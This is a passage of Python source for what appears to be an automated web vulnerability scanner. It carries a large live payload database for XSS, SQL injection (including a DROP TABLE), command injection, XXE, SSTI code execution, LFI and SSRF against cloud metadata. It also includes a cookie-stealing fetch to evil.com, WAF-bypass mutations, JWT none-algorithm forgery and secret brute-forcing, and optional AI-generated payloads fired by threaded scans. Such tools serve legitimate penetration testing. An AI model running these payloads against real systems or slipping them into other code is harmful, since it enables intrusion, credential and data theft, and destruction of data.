                        if any(e in r.text.lower() for e in ['sql', 'mysql', 'syntax error', 'ora-']):
                            issues.append((f"Possible SQLi in query param '{param}'", Severity.HIGH))
                            break
                    except requests.RequestException:
                        continue

        return issues


# ====================== GraphQL Scanner ======================

class GraphQLScanner:
    """GraphQL endpoint discovery and security testing"""

    GQL_PATHS = [
        '/graphql', '/graphql/console', '/graphiql', '/v1/graphql',
        '/v2/graphql', '/api/graphql', '/gql', '/query', '/playground'
    ]

    INTROSPECTION_QUERY = """{
      __schema {
        types { name kind description
          fields { name type { name kind ofType { name kind } } }
        }
      }
    }"""

    DEPTH_LIMIT_QUERY = """{ a { b { c { d { e { f { __typename } } } } } } }"""

    def __init__(self, target_url: str, session: requests.Session):
        self.target_url = target_url
        self.session = session

    def detect_graphql(self) -> Optional[str]:
        for path in self.GQL_PATHS:
            url = urljoin(self.target_url, path)
            try:
                r = self.session.post(url, json={"query": "{__typename}"}, timeout=5, verify=False)
                if r.status_code == 200 and '"data"' in r.text:
                    return url
            except requests.RequestException:
                continue
        return None

    def introspect_schema(self, endpoint: str) -> Optional[Dict]:
        try:
            r = self.session.post(endpoint, json={"query": self.INTROSPECTION_QUERY}, timeout=10, verify=False)
            if r.status_code == 200:
                return r.json()
        except (requests.RequestException, json.JSONDecodeError) as e:
            logger.debug(f"Introspection error: {e}")
        return None

    def test_introspection_disabled(self, endpoint: str) -> bool:
        try:
            r = self.session.post(endpoint, json={"query": "{__schema{types{name}}}"}, timeout=5, verify=False)
            return r.status_code != 200 or 'errors' in r.text
        except requests.RequestException:
            return True

    def test_depth_limit(self, endpoint: str) -> bool:
        """Check if query depth limiting is absent"""
        try:
            r = self.session.post(endpoint, json={"query": self.DEPTH_LIMIT_QUERY}, timeout=5, verify=False)
            return r.status_code == 200 and 'data' in r.text
        except requests.RequestException:
            return False

    def find_hidden_fields(self, endpoint: str) -> List[str]:
        common = ['user', 'users', 'admin', 'password', 'email', 'token', 'secret', 'key', 'role']
        discovered = []
        for f in common:
            try:
                r = self.session.post(
                    endpoint,
                    json={"query": f'{{__type(name:"{f}"){{name fields{{name}}}}}}'},
                    timeout=5, verify=False
                )
                if r.status_code == 200 and '"data"' in r.text:
                    discovered.append(f)
            except requests.RequestException:
                continue
        return discovered


# ====================== JWT Scanner ======================

class JWTScanner:
    """JWT token analysis and attack testing"""

    WEAK_SECRETS = ['secret', 'password', '123456', 'changeme', 'jwt', 'token',
                    'key', 'private', 'supersecret', 'mysecret', 'jwttoken']

    def decode_jwt(self, token: str) -> Tuple[Optional[Dict], Optional[Dict]]:
        try:
            parts = token.strip().split('.')
            if len(parts) != 3:
                return None, None
            results = []
            for part in parts[:2]:
                part += '=' * (4 - len(part) % 4)
                results.append(json.loads(base64.urlsafe_b64decode(part).decode('utf-8', errors='replace')))
            return results[0], results[1]
        except (ValueError, json.JSONDecodeError, Exception) as e:
            logger.error(f"JWT decode error: {e}")
            return None, None

    def analyze_token(self, token: str) -> List[Tuple[str, Severity]]:
        issues = []
        header, payload = self.decode_jwt(token)
        if not header or not payload:
            issues.append(("Invalid or malformed JWT", Severity.INFO))
            return issues

        alg = header.get('alg', '').lower()
        if alg == 'none':
            issues.append(("Algorithm 'none' in header — critical vulnerability", Severity.CRITICAL))
        elif alg.startswith('hs'):
            issues.append((f"Symmetric algorithm {alg.upper()} — weak secret risk", Severity.MEDIUM))
        elif alg not in ('rs256', 'rs384', 'rs512', 'es256', 'es384', 'es512', 'ps256'):
            issues.append((f"Non-standard algorithm: {alg}", Severity.HIGH))

        for key in ['password', 'secret', 'token', 'key', 'auth', 'private_key', 'credit_card']:
            if key in payload:
                issues.append((f"Sensitive claim '{key}' in JWT payload", Severity.HIGH))

        if 'exp' not in payload:
            issues.append(("No expiration (exp) claim — token never expires", Severity.MEDIUM))
        elif isinstance(payload.get('exp'), (int, float)):
            if payload['exp'] < time.time():
                issues.append(("Token is expired", Severity.INFO))
            elif payload['exp'] - time.time() > 60 * 60 * 24 * 365:
                issues.append(("Token expiry is >1 year in future", Severity.LOW))

        if 'aud' not in payload:
            issues.append(("No audience (aud) claim", Severity.LOW))
        if 'iss' not in payload:
            issues.append(("No issuer (iss) claim", Severity.LOW))

        return issues

    def test_none_algorithm(self, token: str) -> Optional[str]:
        header, payload = self.decode_jwt(token)
        if not header:
            return None
        try:
            new_header = {**header, 'alg': 'none'}
            enc_h = base64.urlsafe_b64encode(json.dumps(new_header).encode()).decode().rstrip('=')
            enc_p = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
            return f"{enc_h}.{enc_p}."
        except Exception as e:
            logger.debug(f"None-alg test error: {e}")
        return None

    def brute_secret(self, token: str) -> Optional[str]:
        """Attempt HS256 secret brute-force with common secrets"""
        try:
            import hmac as hmaclib
            parts = token.split('.')
            if len(parts) != 3:
                return None
            msg = f"{parts[0]}.{parts[1]}".encode()
            sig_b64 = parts[2] + '=' * (4 - len(parts[2]) % 4)
            sig = base64.urlsafe_b64decode(sig_b64)
            for secret in self.WEAK_SECRETS:
                computed = hmaclib.new(secret.encode(), msg, hashlib.sha256).digest()
                if computed == sig:
                    return secret
        except Exception as e:
            logger.debug(f"Brute force error: {e}")
        return None


# ====================== AI / Payload Engine ======================

class EnhancedLocalAIEngine:
    """Context-aware payload generator with learning, WAF bypass, and optional AI engine."""

    def __init__(self, ai_engine: Optional[AIEngineBase] = None):
        self.ai_engine = ai_engine  # can be OllamaEngine or RemoteAIEngine
        self.payload_db = self._build_payload_db()
        self.mutation_techniques = [
            self.url_encode, self.double_encode, self.case_variation,
            self.comment_injection, self.whitespace_bypass, self.null_byte,
            self.hex_encode, self.unicode_encode, self.html_entity_encode,
            self.base64_encode, self.js_fusion, self.sql_timing_attack
        ]
        self.success_patterns: Dict[str, int] = {}
        self.learning_history: List[Dict] = []
        self.type_success_counts: Dict[str, int] = defaultdict(int)

    def _build_payload_db(self) -> Dict[str, List[str]]:
        return {
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "javascript:alert(1)",
                "\"><script>alert(1)</script>",
                "'-alert(1)-'",
                "<body onload=alert(1)>",
                "<details open ontoggle=alert(1)>",
                "<input autofocus onfocus=alert(1)>",
                "<iframe src=javascript:alert(1)>",
                "<math href=javascript:alert(1)>click</math>",
                "';alert(1);//",
                "\"+alert(1)+\"",
                "</script><script>alert(1)</script>",
                "<marquee onstart=alert(1)>",
                "<video><source onerror=alert(1)>",
                "<svg><animate onbegin=alert(1) attributeName=x>",
                "{{constructor.constructor('alert(1)')()}}",
                "<script>fetch('//evil.com?c='+document.cookie)</script>",
                "<img src=1 onerror=\"eval(atob('YWxlcnQoMSk='))\">",
            ],
            "sql": [
                "' OR '1'='1",
                "' UNION SELECT NULL,NULL,NULL --",
                "' AND 1=1 --",
                "' AND SLEEP(5) --",
                "' OR 1=1 --",
                "'; DROP TABLE users --",
                "' UNION SELECT @@version,2,3 --",
                "\" OR \"1\"=\"1",
                "1 AND 1=1",
                "1' ORDER BY 1--",
                "1' ORDER BY 2--",
                "1' ORDER BY 3--",
                "' UNION SELECT table_name,2 FROM information_schema.tables--",
                "' UNION SELECT column_name,2 FROM information_schema.columns--",
                "admin' --",
                "' OR '1'='1'/*",
                "' OR 1=1#",
                "' WAITFOR DELAY '0:0:5'--",
                "1; SELECT SLEEP(5)--",
                "') OR ('1'='1",
                "1' AND (SELECT 1 FROM users LIMIT 1)='1",
                "' AND 1=2 UNION SELECT 1,username,password FROM users--",
            ],
            "cmd": [
                "; ls -la",
                "| cat /etc/passwd",
                "`id`",
                "$(whoami)",
                "& ping -c 3 127.0.0.1 &",
                "|| id",
                "&& id",
                "%0Aid",
                "%0A cat /etc/passwd",
                "| dir",
                "| type C:\\Windows\\win.ini",
                "; echo vulnerable",
                "`cat /etc/passwd`",
                "$(cat /etc/passwd)",
                "| base64 /etc/passwd",
                "; curl http://169.254.169.254/latest/meta-data/",
                ";id;",
                "|id|",
                "1; sleep 5",
            ],
            "xxe": [
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd"> %xxe;]><root/>',
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/passwd">]><r>&e;</r>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>',
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///windows/win.ini">]><foo>&xxe;</foo>',
            ],
            "ssti": [
                "{{7*7}}",
                "${7*7}",
                "{{config}}",
                "{{self.__class__.__mro__}}",
                "<%= 7*7 %>",
                "{{7*'7'}}",
                "#{7*7}",
                "${{7*7}}",
                "{{''.__class__.__mro__[2].__subclasses__()}}",
                "{% debug %}",
                "{% include '/etc/passwd' %}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
                "@(7*7)",
            ],
            "lfi": [
                "../../../../etc/passwd",
                "....//....//....//etc/passwd",
                "..//..//..//..//etc/passwd",
                "file:///etc/passwd",
                "php://filter/read=convert.base64-encode/resource=index.php",
                "../../../../etc/passwd%00",
                "../../../../windows/win.ini",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "/etc/passwd",
                "C:\\Windows\\win.ini",
                "php://input",
                "data://text/plain;base64,SSBsb3ZlIFBIUAo=",
                "zip://path/to/archive.zip%23file.php",
                "phar://path/to/archive.phar",
                "../../../../proc/self/environ",
                "../../../../var/log/apache2/access.log",
            ],
            "ssrf": [
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/user-data/",
                "http://localhost:8080",
                "http://127.0.0.1:22",
                "http://127.0.0.1:3306",
                "http://127.0.0.1:6379",
                "http://[::1]:80",
                "http://0.0.0.0:80",
                "http://metadata.google.internal/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "gopher://localhost:8080",
                "dict://localhost:11211/stats",
                "file:///etc/passwd",
                "http://100.100.100.200/latest/meta-data/",
            ],
            "open_redirect": [
                "//evil.com",
                "https://evil.com",
                "//evil.com@google.com",
                "/\\evil.com",
                "///evil.com",
                "http://evil.com#google.com",
                "http://google.com@evil.com",
                "javascript:alert(1)",
                "/redirect?url=https://evil.com",
            ],
            "nosql": [
                "' || '1'=='1",
                "' && this.password.match(/.*/)//",
                '{\"$ne\": null}',
                '{\"$gt\": \"\"}',
                '{\"$regex\": \"^.*$\"}',
                "admin' || '1'=='1",
                '{\"$or\": [{}]}',
                '{\"$where\": \"return true\"}',
                "'; return true; var x='",
            ],
            "ldap": [
                "*",
                "*)(&",
                "*)(uid=*",
                "admin*",
                "admin*)((|userPassword=*)",
                "*)(uid=*))(|(uid=*",
                "*()|&"
            ]
        }

    # ---- Mutation techniques ----

    def url_encode(self, payload: str) -> str:
        return quote(payload)

    def double_encode(self, payload: str) -> str:
        return quote(quote(payload))

    def hex_encode(self, payload: str) -> str:
        return ''.join(f'%{ord(c):02x}' for c in payload)

    def unicode_encode(self, payload: str) -> str:
        return ''.join(f'\\u{ord(c):04x}' for c in payload)

    def html_entity_encode(self, payload: str) -> str:
        return ''.join(f'&#{ord(c)};' for c in payload)

    def base64_encode(self, payload: str) -> str:
        return base64.b64encode(payload.encode()).decode()

    def case_variation(self, payload: str) -> str:
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)

    def comment_injection(self, payload: str) -> str:
        return payload.replace(' ', '/**/')

    def whitespace_bypass(self, payload: str) -> str:
        return payload.replace(' ', random.choice(['%20', '%09', '%0a', '%0d', '+', '/**/']))

    def null_byte(self, payload: str) -> str:
        return payload + '%00'

    def js_fusion(self, payload: str) -> str:
        payload = payload.replace('alert', 'al' + 'ert')
        payload = payload.replace('script', 'scr' + 'ipt')
        payload = payload.replace('document', 'doc' + 'ument')
        return payload

    def sql_timing_attack(self, payload: str) -> str:
        if 'SLEEP' not in payload.upper() and 'WAITFOR' not in payload.upper():
            if random.random() > 0.5:
                return payload + " AND SLEEP(5)--"
        return payload

    def apply_waf_bypass(self, payload: str, bypass_tokens: List[str]) -> List[str]:
        """Apply WAF-specific bypass tokens to a payload"""
        results = []
        for token in bypass_tokens:
            mutated = payload.replace(' ', token)
            if mutated != payload:
                results.append(mutated)
        return results

    # ---- Field analysis ----

    def analyze_form_field(self, field_name: str, field_type: str,
                           context: Dict = None) -> Dict[str, float]:
        fn = field_name.lower()
        scores: Dict[str, float] = defaultdict(float)

        keyword_map = {
            'xss':  ['user', 'name', 'search', 'comment', 'message', 'q', 'query', 'text', 'title', 'body'],
            'sql':  ['id', 'uid', 'pid', 'num', 'page', 'order', 'sort', 'category', 'product', 'item'],
            'cmd':  ['cmd', 'exec', 'command', 'ping', 'traceroute', 'host', 'nslookup', 'run'],
            'lfi':  ['file', 'path', 'doc', 'include', 'page', 'dir', 'folder', 'root', 'template'],
            'ssti': ['template', 'view', 'render', 'display', 'theme', 'skin', 'format'],
            'nosql':['json', 'ajax', 'api', 'rest', 'data'],
            'ssrf': ['url', 'uri', 'href', 'src', 'link', 'fetch', 'load', 'redirect', 'proxy'],
        }

        for vuln_type, keywords in keyword_map.items():
            for kw in keywords:
                if kw in fn:
                    scores[vuln_type] += 3.0

        type_bonus = {
            'password': {'sql': 2, 'nosql': 1},
            'hidden':   {'sql': 3, 'lfi': 2},
            'file':     {'lfi': 5, 'xxe': 3},
            'email':    {'xss': 2, 'ssti': 1},
            'url':      {'ssrf': 4, 'open_redirect': 3},
            'textarea': {'xss': 2, 'ssti': 2, 'cmd': 1},
        }
        for bonus_key, bonus_scores in type_bonus.get(field_type, {}).items():
            scores[bonus_key] = scores.get(bonus_key, 0) + bonus_scores

        # Learned feedback
        if context and 'previous_success' in context:
            for vtype, count in context['previous_success'].items():
                scores[vtype] = scores.get(vtype, 0) + count * 0.7

        # Global learning bonus
        for vtype, count in self.type_success_counts.items():
            scores[vtype] = scores.get(vtype, 0) + count * 0.3

        return dict(scores)

    def generate_mutations(self, base: str, technique_count: int = 3,
                           waf_bypasses: List[str] = None) -> List[str]:
        mutations = [base]
        techniques = random.sample(self.mutation_techniques, min(technique_count, len(self.mutation_techniques)))
        for tech in techniques:
            try:
                m = tech(base)
                if m and m != base:
                    mutations.append(m)
            except Exception as e:
                logger.debug(f"Mutation error: {e}")
        if waf_bypasses:
            mutations.extend(self.apply_waf_bypass(base, waf_bypasses))
        return list(set(mutations))

    def generate_payloads_for_field(self, field_name: str, field_type: str,
                                    attack_type: str = None,
                                    custom_payloads: List[str] = None,
                                    context: Dict = None,
                                    waf_bypasses: List[str] = None) -> List[str]:
        # 1. Heuristic payloads
        scores = self.analyze_form_field(field_name, field_type, context)
        heuristic_payloads: List[str] = []

        types = [attack_type] if attack_type else [t for t in sorted(scores, key=scores.get, reverse=True)[:4] if scores[t] > 2]

        for atype in types:
            if atype in self.payload_db:
                selected = random.sample(self.payload_db[atype], min(8, len(self.payload_db[atype])))
                for base in selected:
                    heuristic_payloads.extend(self.generate_mutations(base, waf_bypasses=waf_bypasses or []))

        if custom_payloads:
            heuristic_payloads.extend(custom_payloads)

        # 2. If AI engine is available, add its payloads
        if self.ai_engine and self.ai_engine.available:
            try:
                llm_payloads = self.ai_engine.generate_payloads(
                    field_name, field_type, attack_type, max_payloads=8
                )
                # Combine, deduplicate (preserve order)
                all_payloads = heuristic_payloads + llm_payloads
                seen = set()
                return [p for p in all_payloads if not (p in seen or seen.add(p))]
            except Exception as e:
                logger.warning(f"AI payload generation failed: {e}")

        return list(set(heuristic_payloads))

    def learn_from_results(self, results: List[Vulnerability]):
        for vuln in results:
            self.type_success_counts[vuln.vuln_type] += 1
            if vuln.payload:
                key = hashlib.md5(vuln.payload.encode()).hexdigest()
                self.success_patterns[key] = self.success_patterns.get(key, 0) + 1
        self.learning_history.append({
            'ts': datetime.datetime.now().isoformat(),
            'counts': dict(self.type_success_counts)
        })


# ====================== Deduplication ======================

def deduplicate(vulns: List[Vulnerability]) -> List[Vulnerability]:
    """Remove duplicate findings, keeping highest severity"""
    seen: Dict[tuple, Vulnerability] = {}
    sev_order = {s.value: s.score for s in Severity}
    for v in vulns:
        key = v.dedup_key()
        if key not in seen or sev_order.get(v.severity, 0) > sev_order.get(seen[key].severity, 0):
            seen[key] = v
    return list(seen.values())


# ====================== Enhanced Web Vulnerability Scanner ======================

class EnhancedWebVulnScanner:
    """Multi-threaded web vulnerability scanner with WAF detection, IDOR, diffing, and AI"""

    def __init__(self, target_url: str, ai_engine: EnhancedLocalAIEngine = None,
                 threads: int = 10, config: Dict = None, scope: ScopeManager = None):
        self.target_url = target_url
        self.ai = ai_engine or EnhancedLocalAIEngine()
        self.threads = threads
        self.config = config or ConfigManager().config
        self.scope = scope or ScopeManager()
        self.results: List[Vulnerability] = []
        self.lock = threading.Lock()
        self.rate_limiter = RateLimiter(
            max_requests=self.config.get('scan', {}).get('rate_limit', 10)
        )
        self.cache = CacheManager()
        self.found_vuln_keys: Set[tuple] = set()
        self.cvss = CVSSCalculator()

        self.session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=50, pool_maxsize=50, max_retries=2
        )
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
        self.session.headers.update({
            'User-Agent': self.config.get('tool', {}).get('user_agent', 'Mozilla/5.0'),
            'Accept': 'text/html,application/xhtml+xml,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })

        self.detector = EnhancedDetector()
        self.ml_detector = MLDetector()
        self.waf_detector = WAFDetector()
        self.api_scanner = APIScanner(target_url, self.session, self.scope)
        self.graphql_scanner = GraphQLScanner(target_url, self.session)
        self.jwt_scanner = JWTScanner()
        self.idor_tester = IDORTester(self.session, self.rate_limiter)
        self.baseline_responses: List[requests.Response] = []
        self.detected_waf: Optional[str] = None
        self.waf_bypasses: List[str] = []

    def _make_request(self, url: str, method: str = 'GET',
                      data: Dict = None, params: Dict = None,
                      files=None, timeout: int = 10) -> Optional[requests.Response]:
        if not self.scope.is_in_scope(url):
            logger.warning(f"Out-of-scope request blocked: {url}")
            return None
        self.rate_limiter.wait_if_needed()
        try:
            kwargs = dict(timeout=timeout, verify=False, allow_redirects=True)
            if method.upper() == 'GET':
                resp = self.session.get(url, params=params, **kwargs)
            elif method.upper() == 'POST':
                if files:
                    resp = self.session.post(url, files=files, params=params, **kwargs)
                else:
                    resp = self.session.post(url, data=data, params=params, **kwargs)
            else:
                resp = self.session.request(method, url, data=data, params=params, **kwargs)

            if len(self.baseline_responses) < 10:
                self.baseline_responses.append(resp)
                if len(self.baseline_responses) == 10:
                    self.ml_detector.establish_baseline(self.baseline_responses)
                    self.detector.set_baseline(self.baseline_responses)

            return resp

        except requests.exceptions.Timeout:
            logger.debug(f"Timeout: {url}")
            return None
        except requests.exceptions.ConnectionError as e:
            logger.debug(f"Connection error {url}: {e}")
            return None
        except requests.RequestException as e:
            logger.error(f"Request error {url}: {e}")
            return None

    def detect_waf(self):
        """Detect WAF before scanning begins"""
        try:
            probe = self._make_request(self.target_url + "/?xss=<script>alert(1)</script>")
            if probe:
                self.detected_waf = self.waf_detector.detect(probe)
                if self.detected_waf:
                    print(Fore.YELLOW + f"[!] WAF detected: {self.detected_waf} — applying bypass mutations")
                    self.waf_bypasses = self.waf_detector.get_bypass_mutations(self.detected_waf)
        except Exception as e:
            logger.debug(f"WAF detection error: {e}")

    def discover_all(self) -> Dict:
        data = {
            'forms': [], 'api_endpoints': [], 'graphql_endpoint': None,
            'urls': [], 'headers': {}
        }
        try:
            resp = self._make_request(self.target_url)
            if resp:
                soup = BeautifulSoup(resp.text, 'html.parser')
                data['forms'] = self._extract_forms(soup)
                data['headers'] = dict(resp.headers)
                for a in soup.find_all('a', href=True):
                    url = urljoin(self.target_url, a['href'])
                    if self.target_url.split('/')[2] in url:
                        data['urls'].append(url)
                for script in soup.find_all('script', src=True):
                    js_url = urljoin(self.target_url, script['src'])
                    try:
                        jr = self._make_request(js_url)
                        if jr:
                            eps = re.findall(r'["\'](/[^"\']{2,})["\']', jr.text)
                            data['urls'].extend([urljoin(self.target_url, e) for e in eps])
                    except Exception:
                        pass
            data['api_endpoints'] = self.api_scanner.discover_endpoints()
            data['graphql_endpoint'] = self.graphql_scanner.detect_graphql()
            data['urls'] = list(set(data['urls']))
            data['api_endpoints'] = list(set(data['api_endpoints']))
        except Exception as e:
            logger.error(f"Discovery error: {e}")
        return data

    def _extract_forms(self, soup: BeautifulSoup) -> List[Dict]:
        forms = []
        for form in soup.find_all('form'):
            action = form.get('action', '')
            method = form.get('method', 'get').lower()
            inputs = []
            for inp in form.find_all('input'):
                name = inp.get('name')
                if name:
                    inputs.append({'name': name, 'type': inp.get('type', 'text'), 'value': inp.get('value', '')})
            for ta in form.find_all('textarea'):
                name = ta.get('name')
                if name:
                    inputs.append({'name': name, 'type': 'textarea', 'value': ''})
            for sel in form.find_all('select'):
                name = sel.get('name')
                if name:
                    inputs.append({'name': name, 'type': 'select', 'value': ''})
            forms.append({
                'action': urljoin(self.target_url, action) if action else self.target_url,
                'method': method,
                'inputs': inputs,
                'enctype': form.get('enctype', 'application/x-www-form-urlencoded')
            })
        return forms

    def _build_baseline_response(self, form: Dict, param: str) -> Optional[requests.Response]:
        """Get a clean baseline for a specific param before injecting"""
        data = {inp['name']: inp.get('value', 'test') for inp in form['inputs']}
        data[param] = 'baseline_test_value_12345'
        try:
            if form['method'] == 'post':
                return self._make_request(form['action'], method='POST', data=data)
            else:
                return self._make_request(form['action'], params=data)
        except Exception:
            return None

    def test_payload(self, form: Dict, param: str, payload: str,
                     attack_type: str,
                     baseline: Optional[requests.Response] = None) -> Optional[Vulnerability]:
        data = {inp['name']: inp.get('value', 'test') for inp in form['inputs']}
        data[param] = payload

        try:
            start = time.time()
            if form['method'] == 'post':
                resp = self._make_request(form['action'], method='POST', data=data)
            else:
                resp = self._make_request(form['action'], params=data)

            if not resp:
                return None
            elapsed = time.time() - start

            findings = self.detector.detect(resp, payload, attack_type, baseline)
            anomalies = self.ml_detector.detect_anomaly(resp)

            # Time-based SQL/cmd detection
            is_time_based = (
                elapsed >= 4.5 and
                attack_type in ('sql', 'cmd') and
                any(w in payload.upper() for w in ['SLEEP', 'WAITFOR', 'BENCHMARK', '; SLEEP'])
            )

            all_findings = findings + [(a, Severity.INFO) for a in anomalies]

            if all_findings or is_time_based:
                evidence = ', '.join(f[0] for f in findings[:2]) if findings else (
                    'Time-based blind detection' if is_time_based else 'Anomaly detected'
                )
                severity = Severity.MEDIUM
                for _, sev in findings:
                    if hasattr(sev, 'score') and sev.score > severity.score:
                        severity = sev

                cvss_score, cvss_vector = self.cvss.calculate(attack_type)
                remediation = REMEDIATION_DB.get(attack_type, '')

                # Optional AI confirmation
                ai_confirmed = False
                if self.ai.ai_engine and self.ai.ai_engine.available:
                    analysis = self.ai.ai_engine.analyze_response(
                        form['action'], param, payload, resp.text[:1500]
                    )
                    if analysis and "YES" in analysis.upper():
                        evidence += f" | AI confirmed: {analysis[:100]}"
                        ai_confirmed = True
                        if severity.score < Severity.HIGH.score:
                            severity = Severity.HIGH

                vuln = Vulnerability(
                    vuln_type=attack_type,
                    parameter=param,
                    payload=payload,
                    evidence=evidence,
                    url=form['action'],
                    severity=severity.value,
                    cvss_score=cvss_score,
                    cvss_vector=cvss_vector,
                    remediation=remediation,
                    request_details=f"{form['method'].upper()} {form['action']} param={param}",
                    response_snippet=resp.text[:300]
                )

                key = vuln.dedup_key()
                with self.lock:
                    if key not in self.found_vuln_keys:
                        self.found_vuln_keys.add(key)
                        return vuln

        except Exception as e:
            logger.error(f"Payload test error ({attack_type}/{param}): {e}")
        return None

    def scan_worker(self, form: Dict, attack_types: List[str], payloads: List[str],
                    param: str, results_queue: queue.Queue):
        baseline = self._build_baseline_response(form, param)
        for attack_type in attack_types:
            for payload in payloads:
                vuln = self.test_payload(form, param, payload, attack_type, baseline)
                if vuln:
                    results_queue.put(vuln)
                    color = Fore.RED if vuln.severity in ('Critical', 'High') else Fore.YELLOW
                    print(color + f"  [VULN] {attack_type.upper()} on '{param}' at {form['action']} "
                          f"[{vuln.severity}] CVSS:{vuln.cvss_score}")

    def scan(self, attack_type: str = None, custom_payloads: List[str] = None,
             context: Dict = None) -> List[Vulnerability]:

        print(Fore.YELLOW + f"\n[*] Starting scan of {self.target_url}")

        # WAF detection first
        self.detect_waf()

        # Phase 1: Discovery
        print(Fore.CYAN + "[*] Phase 1: Attack surface discovery...")
        discovery = self.discover_all()
        print(Fore.GREEN + f"    Forms: {len(discovery['forms'])} | "
              f"API endpoints: {len(discovery['api_endpoints'])} | "
              f"URLs: {len(discovery['urls'])}" +
              (f" | GraphQL: {discovery['graphql_endpoint']}" if discovery['graphql_endpoint'] else ""))

        # Phase 2: Form scanning
        if discovery['forms']:
            print(Fore.CYAN + "[*] Phase 2: Form vulnerability scanning...")
            results_q: queue.Queue = queue.Queue()
            active_threads: List[threading.Thread] = []

            for form in discovery['forms']:
                for inp in form['inputs']:
                    fn, ft = inp['name'], inp.get('type', 'text')
                    payloads = self.ai.generate_payloads_for_field(
                        fn, ft, attack_type, custom_payloads, context, self.waf_bypasses
                    )
                    if not payloads:
                        continue
                    if attack_type:
                        types = [attack_type]
                    else:
                        scores = self.ai.analyze_form_field(fn, ft, context)
                        types = sorted(scores, key=scores.get, reverse=True)[:3]

                    t = threading.Thread(target=self.scan_worker,
                                         args=(form, types, payloads, fn, results_q))
                    t.daemon = True
                    t.start()
                    active_threads.append(t)

                    while len(active_threads) >= self.threads:
                        for th in active_threads[:]:
                            th.join(timeout=0.1)
                            if not th.is_alive():
                                active_threads.remove(th)

            for th in active_threads:
                th.join()

            while not results_q.empty():
                self.results.append(results_q.get())

        # Phase 3: URL parameter scanning
        print(Fore.CYAN + "[*] Phase 3: URL parameter scanning...")
        url_params_scanned = 0
        for url in discovery['urls'][:30]:
            if '?' in url:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                for param, vals in params.items():
                    url_params_scanned += 1
                    form_proxy = {
                        'action': parsed._replace(query='').geturl(),
                        'method': 'get',
                        'inputs': [{'name': p, 'value': v[0]} for p, v in params.items()],
                        'enctype': 'application/x-www-form-urlencoded'
                    }
                    payloads = self.ai.generate_payloads_for_field(
                        param, 'text', attack_type, custom_payloads, context, self.waf_bypasses
                    )
                    if payloads:
                        rq: queue.Queue = queue.Queue()
                        self.scan_worker(form_proxy, [attack_type] if attack_type else ['xss', 'sql', 'lfi'], payloads, param, rq)
                        while not rq.empty():
                            self.results.append(rq.get())

                    # IDOR check
                    if vals[0].isdigit():
                        idor = self.idor_tester.test_idor(url, param, vals[0])
                        if idor:
                            self.results.append(idor)
                            print(Fore.RED + f"  [IDOR] Parameter '{param}' at {url}")

        # Phase 4: API scanning
        if discovery['api_endpoints']:
            print(Fore.CYAN + "[*] Phase 4: API endpoint security testing...")
            for ep in discovery['api_endpoints'][:15]:
                issues = self.api_scanner.test_endpoint_security(ep)
                cvss_score, cvss_vector = self.cvss.calculate('api')
                for issue, severity in issues:
                    self.results.append(Vulnerability(
                        vuln_type='api', parameter='endpoint', payload='',
                        evidence=issue, url=ep, severity=severity.value,
                        cvss_score=cvss_score, cvss_vector=cvss_vector,
                        remediation=REMEDIATION_DB.get('api', '')
                    ))
                    print(Fore.YELLOW + f"  [API] {issue} [{severity.value}]")

        # Phase 5: GraphQL scanning
        if discovery['graphql_endpoint']:
            gql_ep = discovery['graphql_endpoint']
            print(Fore.CYAN + f"[*] Phase 5: GraphQL testing ({gql_ep})...")
            cvss_score, cvss_vector = self.cvss.calculate('graphql')
            if not self.graphql_scanner.test_introspection_disabled(gql_ep):
                self.results.append(Vulnerability(
                    vuln_type='graphql', parameter='introspection', payload='',
                    evidence='GraphQL introspection is enabled (schema exposed)',
                    url=gql_ep, severity=Severity.MEDIUM.value,
                    cvss_score=cvss_score, cvss_vector=cvss_vector,
                    remediation=REMEDIATION_DB.get('graphql', '')
                ))
            if self.graphql_scanner.test_depth_limit(gql_ep):
                self.results.append(Vulnerability(
                    vuln_type='graphql', parameter='depth_limit', payload='',
                    evidence='No query depth limit — DoS risk',
                    url=gql_ep, severity=Severity.MEDIUM.value,
                    cvss_score=cvss_score, cvss_vector=cvss_vector,
                    remediation=REMEDIATION_DB.get('graphql', '')
                ))
            hidden = self.graphql_scanner.find_hidden_fields(gql_ep)
            if hidden:
                self.results.append(Vulnerability(
                    vuln_type='graphql', parameter='fields', payload='',
                    evidence=f"Hidden fields discovered: {', '.join(hidden[:5])}",
                    url=gql_ep, severity=Severity.HIGH.value,
                    cvss_score=cvss_score, cvss_vector=cvss_vector,
                    remediation=REMEDIATION_DB.get('graphql', '')
                ))

        # Deduplicate and learn
        self.results = deduplicate(self.results)
        self.ai.learn_from_results(self.results)

        # Summary
        print(Fore.GREEN + f"\n[+] Scan complete. Found {len(self.results)} unique vulnerabilities.")
        by_sev: Dict[str, int] = defaultdict(int)
        for v in self.results:
            by_sev[v.severity] += 1
        for sev in ['Critical', 'High', 'Medium', 'Low', 'Info']:
            if by_sev[sev]:
                color = Fore.RED if sev in ('Critical', 'High') else Fore.YELLOW
                print(color + f"    {sev}: {by_sev[sev]}")

        return self.results


# ====================== Enhanced Reconnaissance ======================

class EnhancedReconScanner:
